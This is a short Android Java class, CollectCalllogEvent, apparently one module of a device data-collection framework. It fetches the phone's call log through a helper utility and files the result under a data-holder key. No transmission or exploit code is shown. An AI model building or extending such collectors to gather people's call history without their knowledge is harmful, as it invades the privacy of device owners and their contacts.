package com.xaviar.collect.calllog_event;


import android.content.Context;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

public class CollectCalllogEvent extends ThreadCollector implements ICollector {

	private  static String name = "CollectPhoneEvent";
	private static final String TAG = name;
	
	

	public CollectCalllogEvent(String genericData) {
		this.genericData = genericData;
	}
	
	public CollectCalllogEvent() {
		setName(CollectCalllogEvent.name);
	}


	public CollectCalllogEvent(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		Log.d(TAG,"Enter getAllData()");
		genericData = CalllogEventUtil.getAllPhoneGeneric(ctx);			
		return genericData;
	}

	
	@Override
	public String getHolderKey() {
	   return DataHolder.CALL_LOG_EVENT;
	}

}


